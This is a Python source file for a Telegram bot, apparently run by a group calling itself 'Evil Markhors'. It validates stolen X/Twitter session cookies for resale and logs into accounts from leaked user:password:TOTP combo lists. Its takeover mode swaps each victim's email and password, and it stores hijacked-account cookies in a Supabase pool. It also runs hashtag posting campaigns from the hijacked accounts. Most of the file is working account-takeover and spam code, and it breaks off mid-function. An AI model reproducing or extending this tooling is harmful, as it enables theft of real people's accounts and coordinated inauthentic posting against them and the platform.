#!/usr/bin/env python3
"""
Evil Markhors Bot - HARDENED + CAMPAIGN + SUPABASE POOL + COMMANDS
"""
import os, io, re, sys, json, stat, hmac, time, random, base64, struct, hashlib
import secrets, string, asyncio, logging, tempfile, zipfile, shutil, traceback
from datetime import datetime, timezone, timedelta

try:
    import httpx
    from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.error import RetryAfter
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
        filters, ContextTypes,
    )
except ImportError:
    print("Deps missing: pip install -r requirements.txt")
    raise

# ============================ CONFIG ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN")
WEBSITE = os.getenv("WEBSITE", "https://evilmarkhors.me")
CREDIT = os.getenv("CREDIT", "Config by Evil Markhors")
LIVE_DEFAULT = os.getenv("LIVE", "1") == "1"
CONCURRENCY = int(os.getenv("CONCURRENCY", "8"))
TIMEOUT = float(os.getenv("TIMEOUT", "25"))
ACC_TIMEOUT = float(os.getenv("ACC_TIMEOUT", "90"))
MAX_FILES = int(os.getenv("MAX_FILES", "5000"))
RETRIES = int(os.getenv("RETRIES", "3"))
TWEET_LIMIT = int(os.getenv("TWEET_LIMIT", "265"))
POST_MIN = float(os.getenv("POST_MIN", "45"))
POST_MAX = float(os.getenv("POST_MAX", "110"))
THREAD_GAP_MIN = float(os.getenv("THREAD_GAP_MIN", "4"))
THREAD_GAP_MAX = float(os.getenv("THREAD_GAP_MAX", "9"))
STORE_PATH = os.getenv("STORE_PATH", "users.json")
SUPABASE_URL = os.getenv("SUPABASE_URL", "").rstrip("/")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
DB_TABLE = os.getenv("DB_TABLE", "accounts")
REVERIFY_HOURS = float(os.getenv("REVERIFY_HOURS", "24"))
REVERIFY_BATCH = int(os.getenv("REVERIFY_BATCH", "400"))
REVERIFY_CONC = int(os.getenv("REVERIFY_CONC", "4"))
DEAD_AFTER = int(os.getenv("DEAD_AFTER", "2"))

HERE = os.path.dirname(os.path.abspath(__file__))
SELF = os.path.basename(os.path.abspath(__file__))
DEL_DIR = os.path.join(HERE, "del_data")
CAMP_MEDIA_DIR = os.path.join(HERE, "camp_media")
DEFAULT_TAG = "#EvilMarkhors_Fucked_IIT_INDIA"
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "7028523300,6120166351").split(",") if x.strip()}

SPLIT = {}
CTEST = set()
TWEET = {}
CAMPS = {}
CAMPRUN = {}
STORE_ASK = {}
EXTRACT = {}

KEYMAP = {
    "year": "Year", "followers": "Followers", "friends": "Friends", "posts": "Posts",
    "likes": "Likes", "media": "Media", "verified": "Verified", "card": "Card added",
    "api": "API", "developer api": "Developer API", "protected": "Protected",
    "2fa": "2FA", "country": "Country", "status": "Status", "email": "Email",
    "created": "Created", "verified type": "Verified type", "suspended": "Suspended",
}
NUM_FIELDS = {"year", "followers", "friends", "posts", "likes", "media"}
BOOL_FIELDS = {"verified", "card", "api", "developer api", "protected", "2fa", "suspended"}
PREFIXES = ["", "", "", "", "Update:", "News:", "Breaking:", "Just in:", "Aaj:", "Note:"]
SUFFIXES = ["", "", "", "", "!", ".", " 🔥", " ✔"]
BEARER = ("AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
          "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

FIELDS = ["Status", "Username", "ID", "Followers", "Friends", "Posts", "Likes", "Media",
          "Verified", "Verified type", "Suspended", "Protected", "Country", "Year", "Created",
          "Email", "Phone", "2FA", "Card added", "API", "Developer API"]
_FIELD_RE = re.compile(r"^\s*[\u2013\-]\s*([^:]+?)\s*:\s*(.*)$")

SCHEMA_SQL = """create table if not exists accounts (
  id bigserial primary key, owner bigint, username text not null unique, x_id text,
  cookies jsonb not null, country text, yr text, followers int default 0,
  protected boolean default false, verified boolean default false,
  status text default 'live', fails int default 0, source text,
  created_at timestamptz default now(), last_check timestamptz,
  last_ok timestamptz, last_post timestamptz);
create index if not exists accounts_status_idx on accounts (status);
create index if not exists accounts_country_idx on accounts (country);
create index if not exists accounts_check_idx on accounts (last_check);
alter table accounts enable row level security;
"""

FILES = {
    "requirements.txt": "python-telegram-bot>=21.0\nhttpx>=0.27\n",
    ".gitignore": "__pycache__/\n*.pyc\n.env\nusers.json\nvenv/\n*.zip\nbatch_*.json\ndel_data/\ncamp_media/\ncamp_*.json\n",
    ".dockerignore": "venv\n__pycache__\n*.zip\n.env\nusers.json\ncamp_media\n",
    ".env.example": ("BOT_TOKEN=123456:ABC\nLIVE=1\nCONCURRENCY=8\n"
                     "WEBSITE=https://evilmarkhors.me\nCREDIT=Config by Evil Markhors\n"
                     "STORE_PATH=users.json\nADMIN_IDS=7028523300,6120166351\n"
                     "POST_MIN=45\nPOST_MAX=110\nTWEET_LIMIT=265\n"
                     "SUPABASE_URL=https://xxxx.supabase.co\nSUPABASE_KEY=service_role_key\n"
                     "DB_TABLE=accounts\nREVERIFY_HOURS=24\nREVERIFY_BATCH=400\nDEAD_AFTER=2\n"),
    "Dockerfile": ("FROM python:3.12-slim\nWORKDIR /app\n"
                   "ENV PYTHONUNBUFFERED=1 STORE_PATH=/app/users.json\n"
                   "COPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n"
                   f"COPY {SELF} bot.py\nCMD [\"python\",\"bot.py\"]\n"),
    "railway.toml": ('[build]\nbuilder = "DOCKERFILE"\ndockerfilePath = "Dockerfile"\n\n'
                     '[deploy]\nrestartPolicyType = "ON_FAILURE"\nrestartPolicyMaxRetries = 10\n'),
    "schema.sql": SCHEMA_SQL,
    "README.md": "# Evil Markhors Bot\n\nCookie + ULP reworker + campaign + Supabase pool.\n\nRun schema.sql first.\n",
}


def _w(path, content, overwrite=False):
    full = os.path.join(HERE, path)
    if os.path.exists(full) and not overwrite:
        return False
    with open(full, "w", encoding="utf-8") as fh:
        fh.write(content)
    if path.endswith(".sh"):
        os.chmod(full, os.stat(full).st_mode | stat.S_IEXEC)
    return True


def bootstrap(force=False):
    return [n for n, c in FILES.items() if _w(n, c, force)]


# ============================ COUNTRY MAP ============================
ISO_NAME = {
    "PK": "Pakistan", "IN": "India", "BD": "Bangladesh", "AF": "Afghanistan",
    "US": "United States", "GB": "United Kingdom", "CA": "Canada", "AU": "Australia",
    "AE": "United Arab Emirates", "SA": "Saudi Arabia", "QA": "Qatar", "KW": "Kuwait",
    "OM": "Oman", "BH": "Bahrain", "TR": "Turkey", "IR": "Iran", "IQ": "Iraq",
    "EG": "Egypt", "NG": "Nigeria", "KE": "Kenya", "ZA": "South Africa",
    "DE": "Germany", "FR": "France", "IT": "Italy", "ES": "Spain", "NL": "Netherlands",
    "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland", "PL": "Poland",
    "RU": "Russia", "UA": "Ukraine", "CN": "China", "JP": "Japan", "KR": "South Korea",
    "SG": "Singapore", "MY": "Malaysia", "ID": "Indonesia", "PH": "Philippines",
    "TH": "Thailand", "VN": "Vietnam", "NP": "Nepal", "LK": "Sri Lanka",
    "MV": "Maldives", "MM": "Myanmar", "BR": "Brazil", "AR": "Argentina",
    "MX": "Mexico", "CL": "Chile", "CO": "Colombia", "PE": "Peru", "NZ": "New Zealand",
    "IE": "Ireland", "PT": "Portugal", "CH": "Switzerland", "AT": "Austria",
    "CZ": "Czechia", "GR": "Greece", "HU": "Hungary", "RO": "Romania", "IL": "Israel",
    "JO": "Jordan", "LB": "Lebanon", "SY": "Syria", "YE": "Yemen", "SD": "Sudan",
    "ET": "Ethiopia", "GH": "Ghana", "MA": "Morocco", "DZ": "Algeria", "TN": "Tunisia",
}
NAME_ISO = {v.lower(): k for k, v in ISO_NAME.items()}
CITY_ISO = {
    "karachi": "PK", "lahore": "PK", "islamabad": "PK", "rawalpindi": "PK",
    "peshawar": "PK", "quetta": "PK", "multan": "PK", "faisalabad": "PK",
    "mumbai": "IN", "bombay": "IN", "delhi": "IN", "bangalore": "IN", "bengaluru": "IN",
    "chennai": "IN", "kolkata": "IN", "calcutta": "IN", "pune": "IN", "ahmedabad": "IN",
    "jaipur": "IN", "lucknow": "IN", "kanpur": "IN", "nagpur": "IN", "indore": "IN",
    "bhopal": "IN", "patna": "IN", "surat": "IN", "varanasi": "IN", "agra": "IN",
    "london": "GB", "new york": "US", "california": "US", "texas": "US", "toronto": "CA",
    "dubai": "AE", "abu dhabi": "AE", "riyadh": "SA", "jeddah": "SA", "doha": "QA",
    "istanbul": "TR", "ankara": "TR", "dhaka": "BD", "kabul": "AF", "colombo": "LK",
    "kathmandu": "NP", "sydney": "AU", "melbourne": "AU", "singapore": "SG",
    "kuala lumpur": "MY", "jakarta": "ID", "manila": "PH", "bangkok": "TH",
    "berlin": "DE", "paris": "FR", "madrid": "ES", "rome": "IT", "amsterdam": "NL",
}


def to_iso(v):
    v = (v or "").strip()
    if not v:
        return ""
    if len(v) == 2 and v.isalpha():
        return v.upper()
    lv = v.lower()
    if lv in NAME_ISO:
        return NAME_ISO[lv]
    for name, iso in NAME_ISO.items():
        if len(name) > 3 and name in lv:
            return iso
    for city, iso in CITY_ISO.items():
        if city in lv:
            return iso
    return ""


# ============================ SUPABASE ============================
def db_enabled():
    return bool(SUPABASE_URL and SUPABASE_KEY)


def db_headers(extra=None):
    h = {"apikey": SUPABASE_KEY, "Authorization": "Bearer " + SUPABASE_KEY,
         "Content-Type": "application/json", "Accept": "application/json"}
    if extra:
        h.update(extra)
    return h


def db_url():
    return SUPABASE_URL + "/rest/v1/" + DB_TABLE


async def db_upsert(client, rows):
    if not db_enabled() or not rows:
        return 0, (None if not rows else "db off")
    ok = 0
    for i in range(0, len(rows), 200):
        chunk = rows[i:i + 200]
        try:
            r = await client.post(
                db_url(), params={"on_conflict": "username"},
                headers=db_headers({"Prefer": "resolution=merge-duplicates,return=minimal"}),
                json=chunk, timeout=TIMEOUT * 2)
            if r.status_code < 300:
                ok += len(chunk)
            else:
                logging.warning("db_upsert %s %s", r.status_code, r.text[:200])
        except Exception:
            logging.exception("db_upsert")
    return ok, (None if ok else "upsert fail")


async def db_fetch(client, params, limit=500, offset=0):
    try:
        p = dict(params)
        p["select"] = "*"
        p["limit"] = str(limit)
        p["offset"] = str(offset)
        r = await client.get(db_url(), params=p, headers=db_headers(), timeout=TIMEOUT * 2)
        if r.status_code >= 300:
            logging.warning("db_fetch %s %s", r.status_code, r.text[:200])
            return []
        return r.json() or []
    except Exception:
        logging.exception("db_fetch")
        return []


async def db_patch(client, username, payload):
    try:
        r = await client.patch(db_url(), params={"username": "eq." + username},
                               headers=db_headers({"Prefer": "return=minimal"}),
                               json=payload, timeout=TIMEOUT)
        return r.status_code < 300
    except Exception:
        return False


async def db_delete(client, usernames):
    if not usernames:
        return 0
    ok = 0
    for i in range(0, len(usernames), 100):
        chunk = usernames[i:i + 100]
        try:
            r = await client.delete(db_url(), params={"username": "in.(" + ",".join(chunk) + ")"},
                                    headers=db_headers({"Prefer": "return=minimal"}),
                                    timeout=TIMEOUT * 2)
            if r.status_code < 300:
                ok += len(chunk)
        except Exception:
            logging.exception("db_delete")
    return ok


async def db_count(client, status=None):
    try:
        p = {"select": "id", "limit": "1"}
        if status:
            p["status"] = "eq." + status
        r = await client.get(db_url(), params=p,
                             headers=db_headers({"Prefer": "count=exact"}), timeout=TIMEOUT)
        return int(r.headers.get("content-range", "0-0/0").split("/")[-1])
    except Exception:
        return 0


def now_iso(delta_hours=0):
    return (datetime.now(timezone.utc) + timedelta(hours=delta_hours)).isoformat()


# ============================ STATE ============================
_store = {}
_lock = asyncio.Lock()
BATCH = {}
PEND = {}


def load_store():
    global _store
    try:
        with open(os.path.join(HERE, STORE_PATH), encoding="utf-8") as f:
            _store = json.load(f)
    except Exception:
        _store = {}


def save_store():
    try:
        p = os.path.join(HERE, STORE_PATH)
        with open(p + ".tmp", "w", encoding="utf-8") as f:
            json.dump(_store, f, indent=2)
        os.replace(p + ".tmp", p)
    except Exception:
        logging.exception("store save")


def ucfg(uid):
    return _store.setdefault(str(uid), {"live": LIVE_DEFAULT, "mode": "auto",
                                        "takeover": False, "newpass": "",
                                        "newemail": "", "store": "ask"})


def get_live(uid):
    return bool(ucfg(uid).get("live", LIVE_DEFAULT))


def get_store_mode(uid):
    m = ucfg(uid).get("store", "ask")
    if m in ("db", "both") and not db_enabled():
        return "file"
    return m


async def set_cfg(uid, **kw):
    async with _lock:
        ucfg(uid).update(kw)
        save_store()


def batch_file(uid):
    return os.path.join(HERE, "batch_" + str(uid) + ".json")


def save_batch(uid):
    b = BATCH.get(uid)
    if not b:
        return
    try:
        with open(batch_file(uid), "w", encoding="utf-8") as f:
            json.dump({"lines": b["lines"], "results": b["results"], "ok": b["ok"],
                       "fail": b["fail"], "mode": b["mode"], "started": b["started"]}, f)
    except Exception:
        logging.exception("save_batch")


def clear_batch_file(uid):
    try:
        os.remove(batch_file(uid))
    except Exception:
        pass


def load_batches():
    for fn in os.listdir(HERE):
        if not (fn.startswith("batch_") and fn.endswith(".json")):
            continue
        try:
            uid = fn[6:-5]
            with open(os.path.join(HERE, fn), encoding="utf-8") as f:
                d = json.load(f)
            if d.get("lines"):
                BATCH[uid] = {"tmp": tempfile.mkdtemp(prefix="em_rec_"), "msg": None,
                              "lines": d["lines"], "results": d.get("results", []),
                              "ok": d.get("ok", 0), "fail": d.get("fail", 0),
                              "mode": d.get("mode", "ulp"), "takeover": False,
                              "newpass": "", "newemail": "",
                              "started": d.get("started", time.time())}
        except Exception:
            logging.exception("load_batch %s", fn)


# ============================ PROGRESS ============================
def _fmt_t(sec):
    sec = int(max(sec, 0))
    if sec >= 3600:
        return str(sec // 3600) + "h" + str((sec % 3600) // 60).zfill(2) + "m"
    if sec >= 60:
        return str(sec // 60) + "m" + str(sec % 60).zfill(2) + "s"
    return str(sec) + "s"


async def _edit(msg, text):
    if msg is None:
        return
    for _ in range(3):
        try:
            await msg.edit_text(text)
            return
        except RetryAfter as e:
            await asyncio.sleep(getattr(e, "retry_after", 2))
        except Exception:
            return


class Progress:
    def __init__(self, msg, total, label):
        self.msg, self.total, self.label = msg, total, label
        self.done = self.ok = self.fail = self.pend = 0
        self.start = time.time()
        self.last = 0.0
        self.lock = asyncio.Lock()
        self.phase = "start"

    async def update(self, phase=None, force=False):
        if phase:
            self.phase = phase
        async with self.lock:
            now = time.time()
            if not force and now - self.last < 2.5:
                return
            self.last = now
            el = now - self.start
            pct = int(self.done * 100 / self.total) if self.total else 0
            eta = (el / self.done * (self.total - self.done)) if self.done else 0
            bar = "#" * (pct // 5) + "." * (20 - pct // 5)
            await _edit(self.msg, self.label + "\n" + self.phase + "\n\n" + bar + " "
                        + str(pct) + "%\n" + str(self.done) + "/" + str(self.total)
                        + " | ok " + str(self.ok) + " | fail " + str(self.fail)
                        + " | code " + str(self.pend) + "\nwaqt " + _fmt_t(el)
                        + " | baaqi ~" + _fmt_t(eta))


# ============================ COOKIE MODE ============================
def parse_cookie_file(text):
    data, cookies = {}, []
    for line in text.splitlines():
        m = _FIELD_RE.match(line)
        if m:
            data[m.group(1).strip()] = m.group(2).strip()
        elif "\t" in line and not line.lstrip().startswith("#"):
            cookies.append(line)
    return data, cookies


def cookie_dict(lines):
    d = {}
    for l in lines:
        p = l.split("\t")
        if len(p) >= 7:
            d[p[5]] = p[6]
    return d


def build_cookie_file(data, cookies):
    out = ["Valid Cookie  /  Every day!", WEBSITE, CREDIT, ""]
    for f in FIELDS:
        v = data.get(f)
        out.append("\u2013 " + f + ": " + (v if v not in (None, "") else "\u2013"))
    out.append("\u2013 Cookies: " + CREDIT)
    out.append("")
    out.extend(cookies)
    return "\n".join(out).rstrip() + "\n"


def hdrs(ck):
    return {"Authorization": "Bearer " + BEARER, "x-csrf-token": ck.get("ct0", ""),
            "x-twitter-active-user": "yes",
            "x-twitter-auth-type": "OAuth2Session" if ck.get("auth_token") else "",
            "x-twitter-client-language": "en", "User-Agent": UA, "Accept": "application/json"}


async def get_json(client, ck, url):
    delay = 1.0
    for _ in range(RETRIES):
        try:
            r = await client.get(url, headers=hdrs(ck), cookies=ck, timeout=TIMEOUT)
            if r.status_code in (429, 500, 502, 503):
                await asyncio.sleep(delay)
                delay *= 2
                continue
            return r.json() if r.status_code == 200 else None
        except Exception:
            await asyncio.sleep(delay)
            delay *= 2
    return None


def _yr(s):
    m = re.search(r"(19|20)\d{2}", s or "")
    return m.group(0) if m else ""


async def detect_country(client, ck):
    s = await get_json(client, ck, "https://api.x.com/1.1/account/settings.json")
    if isinstance(s, dict):
        cc = to_iso(s.get("country_code") or "")
        if cc:
            return cc
        tl = s.get("trend_location")
        if isinstance(tl, list) and tl:
            cc = to_iso(tl[0].get("countryCode") or "")
            if cc:
                return cc
            cc = to_iso(tl[0].get("country") or "")
            if cc:
                return cc
    j = await get_json(client, ck,
                       "https://api.x.com/1.1/account/verify_credentials.json"
                       "?include_entities=false&skip_status=true")
    if isinstance(j, dict):
        cc = to_iso(j.get("location") or "")
        if cc:
            return cc
    return ""


async def live_check(client, ck):
    d = {}
    j = await get_json(client, ck,
                       "https://api.x.com/1.1/account/verify_credentials.json"
                       "?include_entities=false&skip_status=true&include_email=true")
    if j:
        d["Status"] = "LIVE"
        d.update({"Username": j.get("screen_name", ""), "ID": j.get("id_str", ""),
                  "Followers": j.get("followers_count", ""),
                  "Friends": j.get("friends_count", ""),
                  "Posts": j.get("statuses_count", ""),
                  "Likes": j.get("favourites_count", ""),
                  "Media": j.get("media_count", ""),
                  "Verified": str(bool(j.get("verified"))).lower(),
                  "Verified type": j.get("verified_type") or "",
                  "Suspended": "false",
                  "Protected": str(bool(j.get("protected"))).lower(),
                  "Email": j.get("email", "")})
        if j.get("created_at"):
            d["Created"] = j["created_at"]
            if _yr(j["created_at"]):
                d["Year"] = _yr(j["created_at"])
        cc = await detect_country(client, ck)
        if cc:
            d["Country"] = cc
    else:
        d["Status"] = "DEAD"
    return d


def db_row_from(data, ck, uid):
    uname = (data.get("Username") or "").strip()
    if not uname:
        return None
    try:
        fol = int(data.get("Followers") or 0)
    except Exception:
        fol = 0
    return {"owner": int(uid) if str(uid).isdigit() else None, "username": uname,
            "x_id": str(data.get("ID") or "") or None, "cookies": ck,
            "country": to_iso(data.get("Country") or "") or None,
            "yr": str(data.get("Year") or "") or None, "followers": fol,
            "protected": str(data.get("Protected") or "").lower() == "true",
            "verified": str(data.get("Verified") or "").lower() == "true",
            "status": "live", "fails": 0, "source": "bot",
            "last_check": now_iso(), "last_ok": now_iso()}


async def rework_cookie(text, client, live, sem):
    data, cookies = parse_cookie_file(text)
    if live and cookies:
        async with sem:
            try:
                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
            except asyncio.TimeoutError:
                ld = {"Status": "DEAD"}
        for k, v in ld.items():
            if v not in ("", None):
                data[k] = str(v)
    elif cookies:
        data.setdefault("Status", "UNKNOWN")
    data["Cookies"] = CREDIT
    return build_cookie_file(data, cookies), data, cookies


# ============================ ULP MODULE ============================
ONB = "https://api.twitter.com/1.1/onboarding/task.json"


def totp_now(sec):
    sec = sec.strip().replace(" ", "").upper()
    key = base64.b32decode(sec + "=" * ((8 - len(sec) % 8) % 8))
    h = hmac.new(key, struct.pack(">Q", int(time.time()) // 30), hashlib.sha1).digest()
    o = h[19] & 15
    return str((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000).zfill(6)


def parse_ulp(line):
    raw = (line or "").strip()
    if not raw:
        return None
    parts = raw.split(":")
    totp = ""
    if len(parts) > 2 and re.fullmatch(r"[A-Z2-7]{16,32}", (parts[-1] or "").strip().upper()):
        totp = parts.pop().strip()
    email = ""
    for i, p in enumerate(parts):
        if "@" in p:
            email = p.strip()
            parts.pop(i)
            break
    parts = [p.strip() for p in parts if p.strip()]
    if len(parts) >= 2:
        username, password = parts[0], ":".join(parts[1:])
    elif len(parts) == 1:
        username, password = "", parts[0]
    else:
        return None
    if not password:
        return None
    return {"username": username, "email": email, "password": password, "totp": totp}


def gen_pass():
    return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(13)) + "!x7"


def alias_email(base, username):
    local, _, domain = base.partition("@")
    return (local + "+" + (username or "x") + "@" + domain) if domain else base


def _H(cl):
    return {"authorization": "Bearer " + BEARER, "content-type": "application/json",
            "user-agent": UA, "x-twitter-active-user": "yes",
            "x-twitter-client-language": "en",
            "x-csrf-token": cl.cookies.get("ct0", ""),
            "x-guest-token": cl.cookies.get("guest_token", ""),
            "x-twitter-auth-type": "OAuth2Client" if cl.cookies.get("auth_token") else ""}


async def _task(cl, payload, start=False):
    r = await cl.post(ONB, params=({"flow_name": "login"} if start else None),
                      json=payload, headers=_H(cl), timeout=TIMEOUT)
    try:
        return r.json()
    except Exception:
        return {}


async def _send(cl, ft, subtask, value):
    return await _task(cl, {"flow_token": ft, "subtask_inputs": [
        {"subtask_id": subtask, "enter_text": {"text": value, "link": "next_link"}}]})


async def _duplication(cl, ft):
    return await _task(cl, {"flow_token": ft, "subtask_inputs": [
        {"subtask_id": "AccountDuplicationCheck",
         "check_logged_in_account": {"link": "AccountDuplicationCheck_false"}}]})


def _logged_in(cl):
    return bool(cl.cookies.get("auth_token") and cl.cookies.get("ct0"))


async def ulp_login(ulp):
    cl = httpx.AsyncClient(follow_redirects=True)
    try:
        r = await cl.post("https://api.twitter.com/1.1/guest/activate.json",
                          headers=_H(cl), timeout=TIMEOUT)
        cl.cookies.set("guest_token", r.json().get("guest_token", ""))
        j = await _task(cl, {"input_flow_data": {"flow_context": {
            "debug_overrides": {}, "start_location": {"location": "splash_screen"}}},
            "subtask_versions": {}}, start=True)
        ft = j.get("flow_token")
        if not ft:
            return cl, False, {}
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginJsInstrumentationSubtask",
             "js_instrumentation": {"response": "{}", "link": "next_link"}}]})
        ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginEnterUserIdentifierSSO", "settings_list": {"setting_responses": [
                {"key": "user_identifier",
                 "response_data": {"text_data": {"result": ulp["username"] or ulp["email"]}}}
            ], "link": "next_link"}}]})
        ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
            {"subtask_id": "LoginEnterPassword",
             "enter_password": {"password": ulp["password"], "link": "next_link"}}]})
        ft = j.get("flow_token", ft)
        subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        if "LoginTwoFactorAuthChallenge" in subs and ulp.get("totp"):
            j = await _send(cl, ft, "LoginTwoFactorAuthChallenge", totp_now(ulp["totp"]))
            ft = j.get("flow_token", ft)
            subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        for s in subs:
            if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
                return cl, False, {"pending": s, "flow_token": ft}
        if "AccountDuplicationCheck" in subs:
            await _duplication(cl, ft)
        return cl, _logged_in(cl), {}
    except Exception:
        logging.exception("ulp_login")
        return cl, False, {}


async def resume_login(st, code):
    cl, ft = st["client"], st["flow_token"]
    j = await _send(cl, ft, st["subtask"], code)
    ft = j.get("flow_token", ft)
    subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
    for s in subs:
        if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
            st["subtask"], st["flow_token"] = s, ft
            return "more"
    if "AccountDuplicationCheck" in subs:
        await _duplication(cl, ft)
    return "ok" if _logged_in(cl) else "fail"


EMAIL_SET = ["https://x.com/i/api/1.1/account/update_email.json",
             "https://api.x.com/1.1/account/update_email.json"]
EMAIL_CFM = ["https://x.com/i/api/1.1/account/confirm_email.json",
             "https://api.x.com/1.1/account/verify_email.json"]


async def set_email(cl, ck, new_email):
    for url in EMAIL_SET:
        try:
            r = await cl.post(url, headers=dict(hdrs(ck), **{
                "content-type": "application/x-www-form-urlencoded"}),
                cookies=ck, data={"email": new_email}, timeout=TIMEOUT)
            if r.status_code == 200:
                return True
        except Exception:
            pass
    return False


async def confirm_email(cl, ck, code):
    for url in EMAIL_CFM:
        for field in ("confirmation_code", "code"):
            try:
                r = await cl.post(url, headers=dict(hdrs(ck), **{
                    "content-type": "application/x-www-form-urlencoded"}),
                    cookies=ck, data={field: code}, timeout=TIMEOUT)
                if r.status_code == 200:
                    return True
            except Exception:
                pass
    return False


async def change_pass(cl, ck, old, new):
    try:
        r = await cl.post("https://twitter.com/i/api/i/account/change_password.json",
                          headers=dict(hdrs(ck), **{
                              "content-type": "application/x-www-form-urlencoded"}),
                          cookies=ck, data={"current_password": old, "password": new,
                                            "password_confirmation": new}, timeout=TIMEOUT)
        return r.status_code == 200
    except Exception:
        return False


async def finish_account(uid, idx, ulp, cl):
    b = BATCH[uid]
    ck = dict(cl.cookies)
    try:
        det = await asyncio.wait_for(live_check(cl, ck), ACC_TIMEOUT)
    except asyncio.TimeoutError:
        det = {}
    res = {"ok": True, "ulp": ulp, "details": det, "line": b["lines"][idx]}
    if b["takeover"] and b["newemail"]:
        ne = alias_email(b["newemail"], det.get("Username") or ulp["username"])
        try:
            if await asyncio.wait_for(set_email(cl, ck, ne), ACC_TIMEOUT):
                res["new_email"] = ne
        except asyncio.TimeoutError:
            pass
        if res.get("new_email"):
            b["results"][idx] = res
            PEND.setdefault(uid, {})[str(idx)] = {"kind": "email", "client": cl,
                                                  "ulp": ulp, "idx": idx, "new_email": ne}
            return "email_pending"
    if b["takeover"]:
        np = b["newpass"] or gen_pass()
        try:
            if await asyncio.wait_for(change_pass(cl, ck, ulp["password"], np), ACC_TIMEOUT):
                res["new_pass"] = np
        except asyncio.TimeoutError:
            pass
    b["results"][idx] = res
    b["ok"] += 1
    await cl.aclose()
    return "done"


def fmt_result(r):
    if not r:
        return ""
    if not r.get("ok"):
        return "== FAIL ==\n" + str(r.get("line", "")) + "\nError: " + str(r.get("err", "")) + "\n"
    u, d = r["ulp"], r["details"]
    o = ["Login: OK", "Username: " + str(d.get("Username", "")), "ID: " + str(d.get("ID", "")),
         "Email: " + str(d.get("Email", "") or u.get("email", "")),
         "Password: " + u["password"], "2FA: " + (u.get("totp", "") or "\u2013")]
    if r.get("new_pass"):
        o.append("New password: " + r["new_pass"])
    if r.get("new_email"):
        o.append("New email: " + r["new_email"])
    if r.get("pending"):
        o.append("STATUS: " + r["pending"])
    for k in ("Followers", "Friends", "Posts", "Likes", "Media", "Verified", "Verified type",
              "Suspended", "Protected", "Country", "Year", "Created", "Phone", "Card added",
              "API", "Developer API"):
        o.append(k + ": " + str(d.get(k, "") or "\u2013"))
    o += [CREDIT, WEBSITE, ""]
    return "\n".join(o)


# ============================ ADMIN HELPERS ============================
def is_admin(uid):
    try:
        return int(uid) in ADMIN_IDS
    except Exception:
        return False


def parse_buckets(spec):
    out = []
    for part in spec.split(","):
        p = part.strip()
        if not p:
            continue
        if p.endswith("+") and p[:-1].strip().isdigit():
            out.append((p, int(p[:-1]), None, None))
        elif "-" in p and p.replace("-", "").isdigit():
            lo, hi = p.split("-", 1)
            out.append((p, int(lo), int(hi), None))
        else:
            out.append((p, None, None, p.lower()))
    return out


def bucket_for(val, buckets, is_num):
    if is_num:
        try:
            n = int(str(val).strip())
        except Exception:
            return None
        for label, lo, hi, _ in buckets:
            if lo is not None and hi is not None and lo <= n <= hi:
                return label
            if lo is not None and hi is None and n >= lo:
                return label
        return None
    v = (val or "").strip().lower()
    for label, _, _, exact in buckets:
        if exact is not None and v == exact:
            return label
    return None


def norm_bool(v):
    v = (v or "").strip().lower()
    if v in ("true", "yes", "1"):
        return "yes"
    if v in ("false", "no", "0"):
        return "no"
    return v


def field_value(data, field):
    return str(data.get(KEYMAP[field], "") or "").strip()


# ============================ TWEET CORE ============================
def split_text(text, limit=TWEET_LIMIT):
    text = (text or "").strip()
    if not text:
        return [""]
    words = text.split()
    rough = max(len(words) // max(limit // 8, 1) + 1, 1)
    cap = max(limit - len(" (" + str(rough) + "/" + str(rough) + ")"), 60)
    parts, cur = [], ""
    for w in words:
        if len(cur) + len(w) + 1 > cap and cur:
            parts.append(cur)
            cur = w
        else:
            cur = (cur + " " + w).strip()
    if cur:
        parts.append(cur)
    if len(parts) > 1:
        n = len(parts)
        parts = [p + " (" + str(i + 1) + "/" + str(n) + ")" for i, p in enumerate(parts)]
    return parts or [""]


def randomize(text):
    t = (text or "").strip()
    tags = re.findall(r"#[\w\u0600-\u06FF]+", t)
    if tags:
        for tag in tags:
            t = t.replace(tag, "", 1)
        t = re.sub(r"\s+", " ", t).strip()
    pre, suf = random.choice(PREFIXES), random.choice(SUFFIXES)
    if pre:
        t = pre + " " + t
    if tags:
        random.shuffle(tags)
        t = (t + " " + " ".join(tags)).strip()
    return (t + suf).strip()


def _uh(ck):
    return {"Authorization": "Bearer " + BEARER, "x-csrf-token": ck.get("ct0", ""),
            "x-twitter-active-user": "yes", "x-twitter-auth-type": "OAuth2Session",
            "User-Agent": UA}


async def upload_media(client, ck, path, mime, category):
    url = "https://upload.twitter.com/i/media/upload.json"
    size = os.path.getsize(path)
    r = await client.post(url, params={"command": "INIT", "media_type": mime,
                                       "total_bytes": size, "media_category": category,
                                       "shared": "true"},
                          headers=_uh(ck), cookies=ck, timeout=TIMEOUT)
    if r.status_code != 200:
        return None
    mid = r.json().get("media_id")
    if not mid:
        return None
